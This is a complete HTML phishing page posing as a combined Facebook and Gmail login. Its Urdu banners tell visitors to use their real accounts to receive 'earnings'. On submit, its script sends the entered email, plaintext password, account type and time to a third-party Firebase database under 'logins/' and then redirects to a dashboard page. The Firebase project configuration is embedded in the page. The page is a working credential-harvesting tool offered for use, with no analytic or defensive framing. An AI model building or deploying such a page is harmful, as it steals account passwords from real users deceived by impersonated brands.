<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Account</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #1f2a40, #1877f2);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      color: #fff;
    }
    .container {
      background: rgba(255,255,255,0.08);
      backdrop-filter: blur(10px);
      border-radius: 20px;
      padding: 30px 25px;
      box-shadow: 0 0 20px #00000044;
      width: 92%;
      max-width: 380px;
      animation: fadeIn 0.8s ease;
    }
    .imgBox {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-bottom: 15px;
    }
    .imgBox img {
      width: 40px;
      height: 40px;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 22px;
    }
    select, input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 10px;
      font-size: 15px;
      border: none;
      background: #f5f6f7;
      color: #000;
    }
    button {
      width: 100%;
      background: #1877f2;
      color: #fff;
      padding: 12px;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
    }
    .popup {
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(255,255,255,0.12);
      backdrop-filter: blur(10px);
      color: #fff;
      padding: 15px 25px;
      border-radius: 10px;
      box-shadow: 0 0 10px #000;
      font-size: 15px;
      border-left: 5px solid #4caf50;
      display: none;
      z-index: 999;
    }
    .popup.show {
      display: block;
      animation: slideDown 0.3s ease;
    }
    @keyframes slideDown {
      from { transform: translate(-50%, -20px); opacity: 0; }
      to   { transform: translate(-50%, 0); opacity: 1; }
    }
    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(20px);}
      to   {opacity: 1; transform: translateY(0);}
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="imgBox">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook">
      <img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Gmail_Icon.png" alt="Gmail">
    </div>

    <h2>Login Account</h2>

<div id="warningMsg" style="background: #ff4444aa; padding: 10px; border-radius: 10px; font-size: 14px; text-align: center; margin-top: -10px; margin-bottom: 10px;">
  براہ کرم اپنا اصلی اکاؤنٹ استعمال کریں۔ اگر آپ نے جعلی یا کسی اور کا اکاؤنٹ استعمال کیا تو آپ کو کمائی نہیں دی جائے گی۔
</div>

<select id="accountType">
      <option value="Facebook">Facebook</option>
      <option value="Gmail">Gmail</option>
    </select>

    <input type="text" id="email" placeholder="Email or Phone" />
    <input type="password" id="password" placeholder="Password" />
    <button onclick="saveLogin()">Log In</button>
  </div>

  <div id="popup" class="popup"></div>

  <!-- Firebase Script -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyBTuVt9xg1uiVF-LMqkRBpQErVNEve7wxM",
      authDomain: "logindb-3ed54.firebaseapp.com",
      databaseURL: "https://logindb-3ed54-default-rtdb.firebaseio.com",
      projectId: "logindb-3ed54",
      storageBucket: "logindb-3ed54.appspot.com",
      messagingSenderId: "462951915771",
      appId: "1:462951915771:web:5e317781e6b95c9123105e"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    function showPopup(msg) {
      const popup = document.getElementById("popup");
      popup.innerText = msg;
      popup.classList.add("show");
      setTimeout(() => popup.classList.remove("show"), 3000);
    }

    window.saveLogin = () => {
      const type = document.getElementById("accountType").value;
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value.trim();

      if (!email || !password) {
        showPopup("Enter login details!");
        return;
      }

      const data = {
        accountType: type,
        email,
        password,
        time: new Date().toLocaleString()
      };

      push(ref(db, "logins/"), data)
        .then(() => {
          showPopup(`${type} login saved successfully!`);
          setTimeout(() => window.location.href = "dashboard.html", 1000);
        })
        .catch(() => showPopup("Error saving data!"));
    };
  
const messages = [
  "براہ کرم اپنا اصلی اکاؤنٹ استعمال کریں۔ اگر آپ نے جعلی یا کسی اور کا اکاؤنٹ استعمال کیا تو آپ کو کمائی نہیں دی جائے گی۔",
  "آپ اب اپنا اصلی جی میل اکاؤنٹ استعمال کر کے لاگ اِن کر سکتے ہیں۔",
  "اپنا پہلے سے استعمال شدہ فیس بک اکاؤنٹ استعمال کریں، نیا جعلی اکاؤنٹ نہ بنائیں۔"
];

let msgIndex = 0;
setInterval(() => {
  document.getElementById("warningMsg").innerHTML = messages[msgIndex];
  msgIndex = (msgIndex + 1) % messages.length;
}, 5000);
  </script>

</body>
</html>
